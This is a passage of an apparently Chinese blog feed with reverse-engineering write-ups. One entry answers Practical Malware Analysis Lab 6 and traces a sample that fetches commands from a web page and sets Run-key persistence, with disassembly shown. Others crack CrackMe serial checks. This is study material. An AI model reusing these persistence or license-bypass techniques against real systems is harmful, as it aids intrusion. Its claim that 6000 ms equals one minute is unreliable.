class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">strlen</span>(key); i++)<br>&#123;<br>key[i] = key[i] - <span class="hljs-number">0xA</span>;<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>, key);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p><img src="/2021/08/13/160CrackMe-010/4.png"></p><p>输入正确的KEY</p><p><img src="/2021/08/13/160CrackMe-010/5.png"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>流程还是比较简单的，算法也很简单，总体上来讲难度不大。</p>]]></content>
    
    
    <categories>
      
      <category>CrackMe</category>
      
    </categories>
    
    
    <tags>
      
      <tag>逆向工程</tag>
      
      <tag>CrackMe</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>恶意代码分析实战-实验6</title>
    <link href="/2021/08/10/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C6/"/>
    <url>/2021/08/10/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C6/</url>
    
    <content type="html"><![CDATA[<h2 id="Lab-6-1"><a href="#Lab-6-1" class="headerlink" title="Lab 6-1"></a>Lab 6-1</h2><h3 id="1-由main函数调用的唯一子过程中发现的主要代码结构是什么？"><a href="#1-由main函数调用的唯一子过程中发现的主要代码结构是什么？" class="headerlink" title="1.由main函数调用的唯一子过程中发现的主要代码结构是什么？"></a>1.由main函数调用的唯一子过程中发现的主要代码结构是什么？</h3><p>使用IDA找到main函数看到调用了一个子函数sub_401000，F5即可看到伪代码。</p><p><img src="/2021/08/10/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C6/6-1-1.png"></p><p>可以看到调用了InternetGetConnectedState这个API，这个函数是用来检测是否联网的，判断本地网络状态。</p><figure class="highlight arduino"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs arduino"><span class="hljs-function">BOOL <span class="hljs-title">InternetGetConnectedState</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">  LPDWORD lpdwFlags,</span></span><br><span class="hljs-params"><span class="hljs-function">  DWORD   dwReserved</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br></code></pre></div></td></tr></table></figure><p>当存在一个连接时返回TRUE，否则返回FALSE。</p><h3 id="2-位于0x40105F的子过程是什么？"><a href="#2-位于0x40105F的子过程是什么？" class="headerlink" title="2.位于0x40105F的子过程是什么？"></a>2.位于0x40105F的子过程是什么？</h3><p><img src="/2021/08/10/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C6/6-1-2.png"></p><p>这样确实看不太出来是做什么的。</p><p>这样看可以看到成功或者失败分别会压入栈不同的文字然后调用。</p><p><img src="/2021/08/10/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C6/6-1-3.png"></p><p>再看实际运行情况，推测应该是一个printf函数。</p><p><img src="/2021/08/10/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C6/6-1-4.png"></p><h3 id="3-这个程序的目的是什么？"><a href="#3-这个程序的目的是什么？" class="headerlink" title="3.这个程序的目的是什么？"></a>3.这个程序的目的是什么？</h3><p>通过上面的函数分析可以得知，这是一个判断是否有网络连接的程序。如果存在网络连接返回1，否则返回0。</p><h2 id="Lab-6-2"><a href="#Lab-6-2" class="headerlink" title="Lab 6-2"></a>Lab 6-2</h2><h3 id="1-main函数调用的第一个子过程执行了什么操作？"><a href="#1-main函数调用的第一个子过程执行了什么操作？" class="headerlink" title="1.main函数调用的第一个子过程执行了什么操作？"></a>1.main函数调用的第一个子过程执行了什么操作？</h3><p>调用的第一个函数是sub_401000，调用了InternetGetConnectedState这个API判断当前是否连接了网络</p><p><img src="/2021/08/10/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C6/6-2-1.png"></p><h3 id="2-位于0x40117F的子过程是什么？"><a href="#2-位于0x40117F的子过程是什么？" class="headerlink" title="2.位于0x40117F的子过程是什么？"></a>2.位于0x40117F的子过程是什么？</h3><p>查看此函数，发现与lab6-1是一样的，所以是一个printf函数。</p><p><img src="/2021/08/10/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C6/6-2-2.png"></p><h3 id="3-被main函数调用的第二个子过程做了什么？"><a href="#3-被main函数调用的第二个子过程做了什么？" class="headerlink" title="3.被main函数调用的第二个子过程做了什么？"></a>3.被main函数调用的第二个子过程做了什么？</h3><p>首先调用了InternetOpenA初始化应用程序对 WinINet 函数的使用。</p><p>然后调用了InternetOpenUrlA下载“<a href="http://www.practicalmalwareanalysis.com/cc.htm%E2%80%9D%E8%BF%99%E4%B8%AA%E9%A1%B5%E9%9D%A2">http://www.practicalmalwareanalysis.com/cc.htm”这个页面</a></p><p>再调用InternetReadFile读取数据，如果读取的前几个字符是“&lt;!–”就成功，如果失败就会打印“Error 2.3: Fail to get command”，读取失败会打印“Error 2.2: Fail to ReadFile”</p><p>openurl失败会打印“Error 2.1: Fail to OpenUrl”</p><p><img src="/2021/08/10/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C6/6-2-3.png"></p><p>再仔细分析一下返回值，可以看到前几个值如果比对都正确的话，那么会把第五个字符给al，而前几个字符是html页面的注释，也就是读取注释的第一个字符。</p><p><img src="/2021/08/10/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C6/6-2-4.png"></p><p>这个函数结束之后，可以看出来后al的值会再次赋给[EBP+var_8]，最终会传给ecx，再压入栈作为printf的一个参数。可以看到压入栈一句话”Success: Parsed command is %c\n”，%c对应的就是这个值，打印出这个字符。</p><p><img src="/2021/08/10/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C6/6-2-5.png"></p><h3 id="4-在这个子过程中使用了什么类型的代码结构？"><a href="#4-在这个子过程中使用了什么类型的代码结构？" class="headerlink" title="4.在这个子过程中使用了什么类型的代码结构？"></a>4.在这个子过程中使用了什么类型的代码结构？</h3><p>if-else的结构</p><h3 id="5-在这个程序中有任何基于网络的指示吗？"><a href="#5-在这个程序中有任何基于网络的指示吗？" class="headerlink" title="5.在这个程序中有任何基于网络的指示吗？"></a>5.在这个程序中有任何基于网络的指示吗？</h3><p>使用了Internet Explorer 7.5/pma作为InternetOpenA函数lpszAgent参数的值，还有<a href="http://www.practicalmalwareanalysis.com/cc.htm%E8%BF%99%E4%B8%AAURL%E3%80%82">http://www.practicalmalwareanalysis.com/cc.htm这个URL。</a></p><p><img src="/2021/08/10/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C6/6-2-6.png"></p><h3 id="6-这个恶意代码的目的是什么？"><a href="#6-这个恶意代码的目的是什么？" class="headerlink" title="6.这个恶意代码的目的是什么？"></a>6.这个恶意代码的目的是什么？</h3><p>首先判断是否联网，如果联网那么就会开始读取<a href="http://www.practicalmalwareanalysis.com/cc.htm%E8%BF%99%E4%B8%AA%E9%A1%B5%E9%9D%A2%E7%9A%84%EF%BC%8C%E7%84%B6%E5%90%8E%E8%8E%B7%E5%8F%96%E6%B3%A8%E9%87%8A%E7%9A%84%E7%AC%AC%E4%B8%80%E4%B8%AA%E5%AD%97%E7%AC%A6%EF%BC%8C%E6%9C%80%E5%90%8E%E5%B0%86%E5%85%B6%E6%89%93%E5%8D%B0%E5%87%BA%E6%9D%A5%EF%BC%8C%E5%86%8D%E8%B0%83%E7%94%A8sleep%E5%87%BD%E6%95%B0">http://www.practicalmalwareanalysis.com/cc.htm这个页面的，然后获取注释的第一个字符，最后将其打印出来，再调用sleep函数</a></p><p><img src="/2021/08/10/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C6/6-2-7.png"></p><h2 id="Lab-6-3"><a href="#Lab-6-3" class="headerlink" title="Lab 6-3"></a>Lab 6-3</h2><h3 id="1-比较在main函数与实验6-2的main函数的调用。从main中调用的新的函数是什么？"><a href="#1-比较在main函数与实验6-2的main函数的调用。从main中调用的新的函数是什么？" class="headerlink" title="1.比较在main函数与实验6-2的main函数的调用。从main中调用的新的函数是什么？"></a>1.比较在main函数与实验6-2的main函数的调用。从main中调用的新的函数是什么？</h3><p>多了一个函数sub_401130函数</p><p><img src="/2021/08/10/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C6/6-3-1.png"></p><p>这个新函数是通过读取到的值来执行不同的操作。</p><p><img src="/2021/08/10/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C6/6-3-2.png"></p><h3 id="2-这个新函数使用的参数是什么？"><a href="#2-这个新函数使用的参数是什么？" class="headerlink" title="2.这个新函数使用的参数是什么？"></a>2.这个新函数使用的参数是什么？</h3><p>使用的参数是通过读取网页资源注释中得到的字符，还有一个是main函数的参数argv[0]，就是程序名本身。</p><p><img src="/2021/08/10/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C6/6-3-8.png"></p><h3 id="3-这个函数包含的主要代码结构是什么？"><a href="#3-这个函数包含的主要代码结构是什么？" class="headerlink" title="3.这个函数包含的主要代码结构是什么？"></a>3.这个函数包含的主要代码结构是什么？</h3><p>包含的主要结构式switch结构</p><h3 id="4-这个函数能够做什么"><a href="#4-这个函数能够做什么" class="headerlink" title="4.这个函数能够做什么"></a>4.这个函数能够做什么</h3><p>首先当字符等于“a”时，可以创建一个文件夹路径是C:\TEMP</p><p><img src="/2021/08/10/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C6/6-3-3.png"></p><p>当字符等于“b”时，会将自身复制到创建文件夹内，并且重命名为cc.exe</p><p><img src="/2021/08/10/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C6/6-3-4.png"></p><p>等于“c”时，会删除文件夹下的cc.exe。</p><p><img src="/2021/08/10/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C6/6-3-5.png"></p><p>等于“d”时，会实现一个自启动功能，在HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run下写入键值</p><p>通过注册表实现自启动可以看这里：<a href="https://b1ack1e.github.io/2021/07/19/%E8%87%AA%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF-%E6%B3%A8%E5%86%8C%E8%A1%A8/">自启动技术-注册表</a></p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">0040118F</span>  |.  <span class="hljs-number">51</span>            push ecx                                 ; /pHandle = kernel<span class="hljs-number">32</span>.<span class="hljs-number">75</span>B<span class="hljs-number">5483</span>B<br><span class="hljs-attribute">00401190</span>  |.  <span class="hljs-number">68</span> <span class="hljs-number">3</span>F<span class="hljs-number">000</span>F<span class="hljs-number">00</span>   push <span class="hljs-number">0</span>xF<span class="hljs-number">003</span>F                             ; |Access = KEY_ALL_ACCESS<br><span class="hljs-attribute">00401195</span>  |.  <span class="hljs-number">6</span>A <span class="hljs-number">00</span>         push <span class="hljs-number">0</span>x<span class="hljs-number">0</span>                                 ; |Reserved = <span class="hljs-number">0</span>x<span class="hljs-number">0</span><br><span class="hljs-attribute">00401197</span>  |.  <span class="hljs-number">68</span> <span class="hljs-number">70714000</span>   push Lab<span class="hljs-number">06</span>-<span class="hljs-number">03</span>.<span class="hljs-number">00407170</span>                   ; |Software\Microsoft\Windows\CurrentVersion\Run<br><span class="hljs-attribute">0040119C</span>  |.  <span class="hljs-number">68</span> <span class="hljs-number">02000080</span>   push <span class="hljs-number">0</span>x<span class="hljs-number">80000002</span>                          ; |hKey = HKEY_LOCAL_MACHINE<br><span class="hljs-attribute">004011A1</span>  |.  FF<span class="hljs-number">15</span> <span class="hljs-number">04604000</span> call dword ptr ds:[&lt;&amp;ADVAPI<span class="hljs-number">32</span>.RegOpenKey&gt;; \RegOpenKeyExA<br><span class="hljs-attribute">004011A7</span>  |.  <span class="hljs-number">6</span>A <span class="hljs-number">0</span>F         push <span class="hljs-number">0</span>xF                                 ; /BufSize = F (<span class="hljs-number">15</span>.)<br><span class="hljs-attribute">004011A9</span>  |.  <span class="hljs-number">68</span> A<span class="hljs-number">0714000</span>   push Lab<span class="hljs-number">06</span>-<span class="hljs-number">03</span>.<span class="hljs-number">004071</span>A<span class="hljs-number">0</span>                   ; |C:\Temp\cc.exe<br><span class="hljs-attribute">004011AE</span>  |.  <span class="hljs-number">6</span>A <span class="hljs-number">01</span>         push <span class="hljs-number">0</span>x<span class="hljs-number">1</span>                                 ; |ValueType = REG_SZ<br><span class="hljs-attribute">004011B0</span>  |.  <span class="hljs-number">6</span>A <span class="hljs-number">00</span>         push <span class="hljs-number">0</span>x<span class="hljs-number">0</span>                                 ; |Reserved = <span class="hljs-number">0</span>x<span class="hljs-number">0</span><br><span class="hljs-attribute">004011B2</span>  |.  <span class="hljs-number">68</span> <span class="hljs-number">68714000</span>   push Lab<span class="hljs-number">06</span>-<span class="hljs-number">03</span>.<span class="hljs-number">00407168</span>                   ; |Malware<br><span class="hljs-attribute">004011B7</span>  |.  <span class="hljs-number">8</span>B<span class="hljs-number">55</span> FC       mov edx,dword ptr ss:[ebp-<span class="hljs-number">0</span>x<span class="hljs-number">4</span>]           ; |<br><span class="hljs-attribute">004011BA</span>  |.  <span class="hljs-number">52</span>            push edx                                 ; |hKey = <span class="hljs-number">0</span>x<span class="hljs-number">23</span>C<br><span class="hljs-attribute">004011BB</span>  |.  FF<span class="hljs-number">15</span> <span class="hljs-number">00604000</span> call dword ptr ds:[&lt;&amp;ADVAPI<span class="hljs-number">32</span>.RegSetValu&gt;; \RegSetValueExA<br></code></pre></div></td></tr></table></figure><p><img src="/2021/08/10/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C6/6-3-6.png"></p><p>等于“e”的时候，调用sleep函数</p><p><img src="/2021/08/10/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C6/6-3-7.png"></p><p>都不满足的话就打印字符串“Error 3.2: Not a valid command provided”</p><h3 id="5-这个恶意代码中有什么本地特征吗？"><a href="#5-这个恶意代码中有什么本地特征吗？" class="headerlink" title="5.这个恶意代码中有什么本地特征吗？"></a>5.这个恶意代码中有什么本地特征吗？</h3><p>有，就是前面分析的注册表键值的修改，还有对于文件夹的创建和文件的复制。</p><h3 id="6-这个恶意代码的目的是什么？-1"><a href="#6-这个恶意代码的目的是什么？-1" class="headerlink" title="6.这个恶意代码的目的是什么？"></a>6.这个恶意代码的目的是什么？</h3><p>判断网络是否连接，然后读取一个网页资源中的注释后的第一个字符，通过这个字符来判断进行何种操作。具体上面已经分析过了。</p><h2 id="Lab-6-4"><a href="#Lab-6-4" class="headerlink" title="Lab 6-4"></a>Lab 6-4</h2><h3 id="1-在实验6-3和6-4的main函数中的调用之间的区别是什么？"><a href="#1-在实验6-3和6-4的main函数中的调用之间的区别是什么？" class="headerlink" title="1.在实验6-3和6-4的main函数中的调用之间的区别是什么？"></a>1.在实验6-3和6-4的main函数中的调用之间的区别是什么？</h3><p>加了一个for循环，sub_401040加了一个参数i。</p><p><img src="/2021/08/10/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C6/6-4-1.png"></p><h3 id="2-什么新的代码结构已经被添加到main中"><a href="#2-什么新的代码结构已经被添加到main中" class="headerlink" title="2.什么新的代码结构已经被添加到main中"></a>2.什么新的代码结构已经被添加到main中</h3><p>for循环结构</p><h3 id="3-这个实验的解析HTML的函数和前面实验中的那些有什么区别"><a href="#3-这个实验的解析HTML的函数和前面实验中的那些有什么区别" class="headerlink" title="3.这个实验的解析HTML的函数和前面实验中的那些有什么区别"></a>3.这个实验的解析HTML的函数和前面实验中的那些有什么区别</h3><p>主要是给InternetOpenA传入的szAgent参数不一样，这个参数先通过sprintf将“Internet Explorer 7.50/pma”与循环次数i拼接起来。第一次是Internet Explorer 7.50/pma0第二次是Internet Explorer 7.50/pma1…以此类推。</p><p><img src="/2021/08/10/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C6/6-4-2.png"></p><h3 id="4-这个程序会运行多久？（假设它已经连接到互联网）"><a href="#4-这个程序会运行多久？（假设它已经连接到互联网）" class="headerlink" title="4.这个程序会运行多久？（假设它已经连接到互联网）"></a>4.这个程序会运行多久？（假设它已经连接到互联网）</h3><p>看这个for循环，每次都会sleep，其中参数是6000ms，是一分钟，也就是每循环一次沉睡一分钟，那么就是1440分钟。</p><p><img src="/2021/08/10/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C6/6-4-3.png"></p><h3 id="5-在这个恶意代码中有什么新的基于网络的迹象吗？"><a href="#5-在这个恶意代码中有什么新的基于网络的迹象吗？" class="headerlink" title="5.在这个恶意代码中有什么新的基于网络的迹象吗？"></a>5.在这个恶意代码中有什么新的基于网络的迹象吗？</h3><p>就是InternetOpenA传入的szAgent参数不同了，每次都会变。</p><h3 id="6-这个恶意代码的目的是什么？-2"><a href="#6-这个恶意代码的目的是什么？-2" class="headerlink" title="6.这个恶意代码的目的是什么？"></a>6.这个恶意代码的目的是什么？</h3><p>跟之前的基本一样，只是运行的时间变得特别长。</p>]]></content>
    
    
    <categories>
      
      <category>恶意代码分析实战</category>
      
    </categories>
    
    
    <tags>
      
      <tag>逆向工程</tag>
      
      <tag>病毒分析</tag>
      
      <tag>Lab</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>160CrackMe-009</title>
    <link href="/2021/08/09/160CrackMe-009/"/>
    <url>/2021/08/09/160CrackMe-009/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这个VB的程序，调用的时候都是传入一个地址，然后地址直接查看是什么也看不到，没有什么有用的，分析起来看得人一头雾水。查了资料之后才知道，VB的变量特征是前两个4字节都是一些数据类型，第三个四字节才是变量，相当于是首地址+0x8的地方。</p><p>比如此时寄存器中值是18F3F4，它实际存储的值是18F3FC处的数据。</p><p><img src="/2021/08/09/160CrackMe-009/4.png"></p><h2 id="初探"><a href="#初探" class="headerlink" title="初探"></a>初探</h2><p>打开程序，看到需要输入name和key输入后弹出错误的提示框。</p><p><img src="/2021/08/09/160CrackMe-009/1.png"></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>查壳，无壳是用VB语言写的。</p><p><img src="/2021/08/09/160CrackMe-009/2.png"></p><p>使用OD搜索错误提示的字符串可以搜索到直接定位到关键跳转。在函数头部下断开始分析。</p><p><img src="/2021/08/09/160CrackMe-009/3.png"></p><p>先获取了输入的name的长度，但是这个长度后面好像是没有参加任何运算的，我没有分析到有参加运算的地方。</p><figure class="highlight basic"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs basic"><span class="hljs-number">004020</span>EF   .  <span class="hljs-number">51</span>            push ecx                                 ; /Step8 = <span class="hljs-number">0018</span>F3E0<br><span class="hljs-number">004020</span>F0   .  <span class="hljs-number">8D45</span> <span class="hljs-number">94</span>       lea eax,dword ptr ss:[ebp-<span class="hljs-number">0</span>x6C]          ; |<br><span class="hljs-number">004020</span>F3   .  BB <span class="hljs-number">02000000</span>   mov ebx,<span class="hljs-number">0</span>x2                              ; |<br><span class="hljs-number">004020</span>F8   .  <span class="hljs-number">52</span>            push edx                                 ; |/var18 = <span class="hljs-number">0018</span>F3BC<br><span class="hljs-number">004020</span>F9   .  <span class="hljs-number">50</span>            push eax                                 ; ||retBuffer8 = <span class="hljs-number">0018</span>F3CC<br><span class="hljs-number">004020</span>FA   .  <span class="hljs-number">899</span>D <span class="hljs-number">54</span>FFFFFF mov dword ptr ss:[ebp-<span class="hljs-number">0</span>xAC],ebx          ; ||<br><span class="hljs-symbol">00402100 </span>  .  <span class="hljs-number">899</span>D <span class="hljs-number">44</span>FFFFFF mov dword ptr ss:[ebp-<span class="hljs-number">0</span>xBC],ebx          ; ||<br><span class="hljs-symbol">00402106 </span>  .  FF15 <span class="hljs-number">18414000</span> <span class="hljs-keyword">call</span> dword ptr ds:[&lt;&amp;MSVBVM50.__vbaLenVa&gt;; |\__vbaLenVar<br><span class="hljs-number">0040210</span>C   .  <span class="hljs-number">8D8</span>D <span class="hljs-number">44</span>FFFFFF lea ecx,dword ptr ss:[ebp-<span class="hljs-number">0</span>xBC]          ; |<br><span class="hljs-symbol">00402112 </span>  .  <span class="hljs-number">50</span>            push eax                                 ; |End8 = <span class="hljs-number">0018</span>F3CC<br><span class="hljs-symbol">00402113 </span>  .  <span class="hljs-number">8D95</span> E8FEFFFF lea edx,dword ptr ss:[ebp-<span class="hljs-number">0</span>x118]         ; |<br><span class="hljs-symbol">00402119 </span>  .  <span class="hljs-number">51</span>            push ecx                                 ; |Start8 = <span class="hljs-number">0018</span>F3E0<br><span class="hljs-number">0040211</span>A   .  <span class="hljs-number">8D85</span> F8FEFFFF lea eax,dword ptr ss:[ebp-<span class="hljs-number">0</span>x108]         ; |<br><span class="hljs-symbol">00402120 </span>  .  <span class="hljs-number">52</span>            push edx                                 ; |TMPend8 = <span class="hljs-number">0018</span>F3BC<br><span class="hljs-symbol">00402121 </span>  .  <span class="hljs-number">8D4</span>D DC       lea ecx,dword ptr ss:[ebp-<span class="hljs-number">0</span>x24]          ; |<br><span class="hljs-symbol">00402124 </span>  .  <span class="hljs-number">50</span>            push eax                                 ; |TMPstep8 = <span class="hljs-number">0018</span>F3CC<br><span class="hljs-symbol">00402125 </span>  .  <span class="hljs-number">51</span>            push ecx                                 ; |Counter8 = <span class="hljs-number">0018</span>F3E0<br><span class="hljs-symbol">00402126 </span>  .  FF15 <span class="hljs-number">20414000</span> <span class="hljs-keyword">call</span> dword ptr ds:[&lt;&amp;MSVBVM50.__vbaVarFo&gt;; \__vbaVarForInit<br></code></pre></div></td></tr></table></figure><p>首先是对于name 的操作，获取了每一位的ascii码值，然后相加。</p><figure class="highlight basic"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs basic"><span class="hljs-symbol">00402134 </span>  . /<span class="hljs-number">0</span>F84 <span class="hljs-number">9</span>C000000 je Andréna.<span class="hljs-number">004021D6</span><br><span class="hljs-number">0040213</span>A   . |<span class="hljs-number">8D55</span> <span class="hljs-number">94</span>       lea edx,dword ptr ss:[ebp-<span class="hljs-number">0</span>x6C]<br><span class="hljs-number">0040213</span>D   . |<span class="hljs-number">8D45</span> DC       lea eax,dword ptr ss:[ebp-<span class="hljs-number">0</span>x24]<br><span class="hljs-symbol">00402140 </span>  . |<span class="hljs-number">52</span>            push edx<br><span class="hljs-symbol">00402141 </span>  . |<span class="hljs-number">50</span>            push eax<br><span class="hljs-symbol">00402142 </span>  . |C745 <span class="hljs-number">9</span>C <span class="hljs-number">01000</span>&gt;mov dword ptr ss:[ebp-<span class="hljs-number">0</span>x64],<span class="hljs-number">0</span>x1<br><span class="hljs-symbol">00402149 </span>  . |<span class="hljs-number">895</span>D <span class="hljs-number">94</span>       mov dword ptr ss:[ebp-<span class="hljs-number">0</span>x6C],ebx<br><span class="hljs-number">0040214</span>C   . |FF15 <span class="hljs-number">90414000</span> <span class="hljs-keyword">call</span> dword ptr ds:[&lt;&amp;MSVBVM50.__vbaI4Var&gt;;  Msvbvm50.__vbaI4Var<br><span class="hljs-symbol">00402152 </span>  . |<span class="hljs-number">8D4</span>D BC       lea ecx,dword ptr ss:[ebp-<span class="hljs-number">0</span>x44]          ; |<br><span class="hljs-symbol">00402155 </span>  . |<span class="hljs-number">50</span>            push eax                                 ; |Start = <span class="hljs-number">0</span>x18F3CC<br><span class="hljs-symbol">00402156 </span>  . |<span class="hljs-number">8D55</span> <span class="hljs-number">84</span>       lea edx,dword ptr ss:[ebp-<span class="hljs-number">0</span>x7C]          ; |<br><span class="hljs-symbol">00402159 </span>  . |<span class="hljs-number">51</span>            push ecx                                 ; |dString8 = <span class="hljs-number">0018</span>F3E0<br><span class="hljs-number">0040215</span>A   . |<span class="hljs-number">52</span>            push edx                                 ; |RetBUFFER = <span class="hljs-number">0018</span>F3BC<br><span class="hljs-number">0040215</span>B   . |FF15 <span class="hljs-number">38414000</span> <span class="hljs-keyword">call</span> dword ptr ds:[&lt;&amp;MSVBVM50.#<span class="hljs-number">632</span>&gt;]     ; \获取每一位<br><span class="hljs-symbol">00402161 </span>  . |<span class="hljs-number">8D45</span> <span class="hljs-number">84</span>       lea eax,dword ptr ss:[ebp-<span class="hljs-number">0</span>x7C]<br><span class="hljs-symbol">00402164 </span>  . |<span class="hljs-number">8D4</span>D A8       lea ecx,dword ptr ss:[ebp-<span class="hljs-number">0</span>x58]<br><span class="hljs-symbol">00402167 </span>  . |<span class="hljs-number">50</span>            push eax                                 ; /String8 = <span class="hljs-number">0018</span>F3CC<br><span class="hljs-symbol">00402168 </span>  . |<span class="hljs-number">51</span>            push ecx                                 ; |ARG2 = <span class="hljs-number">0018</span>F3E0<br><span class="hljs-symbol">00402169 </span>  . |FF15 <span class="hljs-number">70414000</span> <span class="hljs-keyword">call</span> dword ptr ds:[&lt;&amp;MSVBVM50.__vbaStrVa&gt;; \__vbaStrVarVal<br><span class="hljs-number">0040216</span>F   . |<span class="hljs-number">50</span>            push eax                                 ; /String = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-symbol">00402170 </span>  . |FF15 <span class="hljs-number">0</span>C414000 <span class="hljs-keyword">call</span> 